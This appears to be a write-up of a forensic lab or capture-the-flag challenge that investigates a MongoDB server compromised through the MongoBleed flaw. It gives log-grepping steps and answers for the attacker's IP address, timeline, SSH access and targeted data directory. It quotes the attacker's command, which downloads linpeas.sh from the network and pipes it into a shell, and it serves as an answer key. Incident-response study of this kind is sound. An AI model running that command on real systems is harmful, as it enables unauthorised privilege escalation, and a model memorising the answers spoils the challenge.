Scenario:

You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.
You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.

Artifacts:

        - .bash_history
        - auth.log
        - mongod.log

Q) What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?
**cat auth.log | grep -i mongodb**

<img width="1920" height="1080" alt="1" src="https://github.com/user-attachments/assets/1b914097-6cbf-4a25-8a50-e78ea7b7216f" />


Or you can check version in **mongod.log**

**cat mongod.log | grep -i version**

<img width="1920" height="1080" alt="2" src="https://github.com/user-attachments/assets/73689202-1165-45e3-854b-5f2d99ef0dba" />


<img width="1920" height="1080" alt="3" src="https://github.com/user-attachments/assets/f717c118-75df-47ee-ac38-5cca04558192" />


**Answer: CVE-2025-14847**

Q) What is the version of MongoDB installed on the server that the CVE exploited?

**cat mongod.log | grep -i version**

<img width="1920" height="1080" alt="2" src="https://github.com/user-attachments/assets/8a3db03d-140e-4a04-873e-33c4f4305da4" />


**Answer: 8.0.16**

Q) Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.

**cat mongod.log | grep -i ended | less**

<img width="1920" height="1080" alt="4" src="https://github.com/user-attachments/assets/71af0bec-634d-4026-8fa9-b7148652dc3f" />


**Answer: 65.0.76.43**

Q) Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)

**cat mongod.log | grep -i ended | less**

<img width="1920" height="1080" alt="4" src="https://github.com/user-attachments/assets/2c64c5b4-8016-4623-b7b2-f3423efaa877" />


**Answer: 2025-12-29 05:25:52**

Q) Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

**cat mongod.log | tail -n 300**

<img width="1920" height="1080" alt="5" src="https://github.com/user-attachments/assets/ebb8bd0a-51ed-4627-9378-810bf0605bb4" />


I added the connectionId of "Connection ended" to connectionId of "Connection accepted"  (37630+37630=75260) and that was the answer.

**Answer: 75260**

Q) The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?

**cat auth.log | grep -i mongo**

<img width="1920" height="1080" alt="6" src="https://github.com/user-attachments/assets/5a66d48d-b447-4b82-b6d5-de51d6bf6e58" />


**Answer: 2025-12-29 05:40:03**

Q) Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.

**cat mangoadmin/.bash_history**

<img width="1920" height="1080" alt="7" src="https://github.com/user-attachments/assets/0b39c1c5-47f7-4dea-b641-f3c7988b8c72" />


**Answer: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh**

Q) The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?

**cat mangoadmin/.bash_history**

<img width="1920" height="1080" alt="8" src="https://github.com/user-attachments/assets/b2f2bf74-e364-429d-9693-066eaacd942e" />


**Answer: /var/lib/mongodb**
